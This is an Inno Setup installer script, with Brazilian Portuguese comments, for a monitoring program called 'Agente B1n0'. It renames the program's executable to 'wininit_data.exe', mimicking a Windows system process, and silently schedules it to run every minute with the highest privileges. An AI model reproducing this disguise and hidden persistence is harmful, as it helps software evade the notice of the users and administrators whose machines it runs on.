[Setup]
AppId={{8B32145A-7C21-4E6E-A52D-1234567890ABC}
AppName=Agente B1n0
AppVersion=6.6
DefaultDirName={commonpf}\AgenteB1n0
DisableDirPage=yes
PrivilegesRequired=admin 
OutputDir=Output
OutputBaseFilename=Instalador_AgenteB1n0_v6.6
SetupIconFile=mascote.ico
; Se nao tiver mascote.bmp, comente a linha abaixo com um ponto e virgula
; WizardSmallImageFile=mascote.bmp
Compression=lzma
SolidCompression=yes
WizardStyle=modern

[Languages]
Name: "brazilianportuguese"; MessagesFile: "compiler:Languages\BrazilianPortuguese.isl"

[Files]
Source: "dist\monitor\monitor.exe"; DestDir: "{app}"; DestName: "wininit_data.exe"; Flags: ignoreversion
Source: "dist\monitor\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "mascote.ico"; DestDir: "{app}"; Flags: ignoreversion

[Run]
Filename: "schtasks"; Parameters: "/create /tn ""WinDataSync"" /tr ""'{app}\wininit_data.exe'"" /sc minute /mo 1 /rl highest /f"; Flags: runhidden
Filename: "{app}\wininit_data.exe"; Description: "Iniciar Agente B1n0"; Flags: nowait postinstall skipifsilent

[UninstallRun]
Filename: "schtasks"; Parameters: "/delete /tn ""WinDataSync"" /f"; Flags: runhidden
